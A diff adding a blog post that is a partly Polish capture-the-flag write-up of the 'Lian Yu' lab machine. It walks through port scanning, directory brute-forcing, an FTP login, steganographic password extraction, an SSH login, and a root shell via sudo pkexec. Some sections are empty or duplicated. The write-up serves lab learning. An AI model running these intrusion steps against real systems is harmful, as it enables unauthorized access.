@@ -3,4 +3,396 @@ layout: post
 title: First Machine
 ---
 
-First post 
+# Writeup: Lian Yu Machine Walkthrough
+
+---
+
+## **Nmap Scan**
+
+The first step was to scan the machine using **Nmap** to identify open ports and services
+```bash
+┌──(vq4s㉿kali)-[~/Downloads]
+└─$ nmap -sV -sC -T5 10.10.28.229 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 02:52 CET
+Nmap scan report for 10.10.28.229
+Host is up (0.069s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 3.0.2
+22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
+|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
+|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
+|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
+80/tcp  open  http    Apache httpd
+|_http-server-header: Apache
+|_http-title: Purgatory
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          33294/tcp6  status
+|   100024  1          35085/udp   status
+|   100024  1          43024/tcp   status
+|_  100024  1          46182/udp6  status
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+**Results:**
+- Port 21: FTP (vsftpd 3.0.2)
+- Port 22: SSH (OpenSSH 6.7p1)
+- Port 80: HTTP (Apache HTTP Server)
+- Port 111: RPC (rpcbind)
+
+---
+
+## **HTTP Enumeration**
+
+
+Gobuster was used to enumerate hidden directories on the HTTP server
+
+
+```bash
+┌──(vq4s㉿kali)-[~/Downloads]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.28.229 -t 50  
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.28.229
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/island               (Status: 301) [Size: 235] [--> http://10.10.28.229/island/]
+Progress: 21305 / 220561 (9.66%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 21375 / 220561 (9.69%)
+===============================================================
+Finished
+===============================================================
+
+```
+**Result:**
+- `/island/`
+
+
+
+
+```bash
+┌──(vq4s㉿kali)-[~/Downloads]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.28.229/island -t 50 -x php,html,txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.28.229/island
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 199]
+/index.html           (Status: 200) [Size: 345]
+/2100                 (Status: 301) [Size: 240] [--> http://10.10.28.229/island/2100/]
+Progress: 54701 / 882244 (6.20%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 54851 / 882244 (6.22%)
+===============================================================
+Finished
+===============================================================
+
+```
+
+**Result:**
+- `/2100/`
+
+
+
+### **Gobuster na `/island/2100`**
+
+**Komenda:**
+```bash
+┌──(vq4s㉿kali)-[~/Downloads]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.28.229/island/2100 -t 50 -x ticket
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.28.229/island/2100
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              ticket
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/green_arrow.ticket   (Status: 200) [Size: 71]
+Progress: 22052 / 441122 (5.00%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 22100 / 441122 (5.01%)
+===============================================================
+Finished
+===============================================================
+
+```
+
+
+## **Base58 Decoding**
+
+Let's check provided string
+
+
+
+
+
+**FTP login**
+
+```bash
+┌──(vq4s㉿kali)-[~/Downloads]
+└─$ ftp vigilante@10.10.28.229
+Connected to 10.10.28.229.
+220 (vsFTPd 3.0.2)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la 
+229 Entering Extended Passive Mode (|||47692|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
+drwxr-xr-x    4 0        0            4096 May 01  2020 ..
+-rw-------    1 1001     1001           44 May 01  2020 .bash_history
+-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
+-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
+-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
+-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
+-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
+-rw-r--r--    1 0        0          549924 May 05  2020 Queens_Gambit.png
+-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
+226 Directory send OK.
+ftp> get .other_user
+local: .other_user remote: .other_user
+229 Entering Extended Passive Mode (|||13123|).
+150 Opening BINARY mode data connection for .other_user (2483 bytes).
+100% |****************************************************|  2483        4.14 MiB/s    00:00 ETA
+226 Transfer complete.
+2483 bytes received in 00:00 (46.68 KiB/s)
+ftp> get Leave_me_alone.png 
+local: Leave_me_alone.png remote: Leave_me_alone.png
+229 Entering Extended Passive Mode (|||35669|).
+150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
+100% |*******************************************************************************************************|   499 KiB  351.78 KiB/s    00:00 ETA
+226 Transfer complete.
+511720 bytes received in 00:01 (340.53 KiB/s)
+ftp> get Queens_Gambit.png
+local: Queens_Gambit.png remote: Queens_Gambit.png
+229 Entering Extended Passive Mode (|||57882|).
+150 Opening BINARY mode data connection for Queens_Gambit.png (549924 bytes).
+100% |*******************************************************************************************************|   537 KiB  510.20 KiB/s    00:00 ETA
+226 Transfer complete.
+549924 bytes received in 00:01 (478.33 KiB/s)
+ftp> get aa.jpg
+local: aa.jpg remote: aa.jpg
+229 Entering Extended Passive Mode (|||22721|).
+150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
+100% |*******************************************************************************************************|   186 KiB  408.24 KiB/s    00:00 ETA
+226 Transfer complete.
+191026 bytes received in 00:00 (353.74 KiB/s)
+ftp> exit
+221 Goodbye.
+
+```
+
+
+- Successfully logged into FTP and downloaded those files:
+  - `.other_user`
+  - `Leave_me_alone.png`
+  - `Queen's_Gambit.png`
+  - `aa.jpg`
+
+
+## **Analiza plików graficznych**
+
+### **Steganografia w `aa.jpg`**
+
+Plik `aa.jpg` zawierał ukrytą zawartość, którą wydobyto za pomocą **steghide**.
+
+**Komenda:**
+```bash
+┌──(vq4s㉿kali)-[~/Downloads/Lian_Yu]
+└─$ steghide extract -sf aa.jpg            
+Enter passphrase: 
+wrote extracted data to "ss.zip".
+┌──(vq4s㉿kali)-[~/Downloads/Lian_Yu]
+└─$ unzip ss.zip       
+Archive:  ss.zip
+  inflating: passwd.txt              
+  inflating: shado             
+```
+
+**Wynik:**
+- Wydobyto archiwum `ss.zip`.
+- Po rozpakowaniu znaleziono pliki `passwd.txt` i `shado`.
+
+**Zawartość `passwd.txt` oraz `shado`:**
+```
+┌──(vq4s㉿kali)-[~/Downloads/Lian_Yu]
+└─$ cat passwd.txt && cat shado 
+This is your visa to Land on Lian_Yu # Just for Fun ***
+
+
+a small Note about it
+
+
+Having spent years on the island, Oliver learned how to be resourceful and 
+set booby traps all over the island in the common event he ran into dangerous
+people. The island is also home to many animals, including pheasants,
+wild pigs and wolves.
+
+
+
+
+
+M3tahuman
+
+```
+
+Hasło `M3tahuman` zostało wykorzystane do kolejnych kroków.
+
+---
+
+## **7. Logowanie na użytkownika `slade` przez SSH**
+
+Zidentyfikowano nowego użytkownika `slade`. Użyto hasła z `passwd.txt`.
+
+**Komenda:**
+```bash
+┌──(vq4s㉿kali)-[~/Downloads/Lian_Yu]
+└─$ ssh slade@10.10.28.229    
+slade@10.10.28.229's password: 
+                              Way To SSH...
+                          Loading.........Done.. 
+                   Connecting To Lian_Yu  Happy Hacking
+
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
+██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
+ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
+
+
+        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
+        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
+        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
+        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
+        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
+        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
+
+```
+
+**Wynik:**
+- Zalogowano pomyślnie.
+
+W katalogu użytkownika znaleziono plik `user.txt`.
+
+**Zawartość `user.txt`:**
+```
+slade@LianYu:~$ ls -la 
+total 32
+drwx------ 2 slade slade 4096 May  1  2020 .
+drwxr-xr-x 4 root  root  4096 May  1  2020 ..
+-rw------- 1 slade slade   22 May  1  2020 .bash_history
+-rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
+-rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
+-r-------- 1 slade slade   77 May  1  2020 .Important
+-rw-r--r-- 1 slade slade  675 May  1  2020 .profile
+-r-------- 1 slade slade   63 May  1  2020 user.txt
+```
+
+---
+
+## **8. Privilege Escalation**
+
+Sprawdzono przywileje sudo użytkownika `slade`.
+
+**Komenda:**
+```bash
+slade@LianYu:~$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+slade@LianYu:~$ sudo pkexec /bin/sh
+```
+
+**Wynik:**
+- Użytkownik może uruchomić `/usr/bin/pkexec` jako root.
+
+Uruchomiono interaktywną powłokę root:
+
+**Komenda:**
+```bash
+sudo pkexec /bin/sh
+```
+
+**Wynik:**
+- Uzyskano dostęp do konta root.
+
+W katalogu root znaleziono plik `root.txt`.
+
+**Zawartość `root.txt`:**
+```
+slade@LianYu:~$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+slade@LianYu:~$ sudo pkexec /bin/sh
+# id
+# bash
+root@LianYu:~# pwd
+/root
+root@LianYu:~# ls -la 
+total 28
+drwx------  3 root root 4096 May  1  2020 .
+drwxr-xr-x 23 root root 4096 May  1  2020 ..
+-rw-------  1 root root   22 May  1  2020 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  2 root root 4096 May  1  2020 .gnupg
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r--r--  1 root root  340 May  1  2020 root.txt
+```
+
+---
+
+## **Podsumowanie**
+
+Maszyna "Lian Yu" była dobrze zaprojektowana, z elementami steganografii, dekodowania i klasycznego privilege escalation. Proces był liniowy, ale wymagał dokładności przy analizie plików i elementów HTML.
+
+**Dziękuję za uwagę!** 😊
+
+
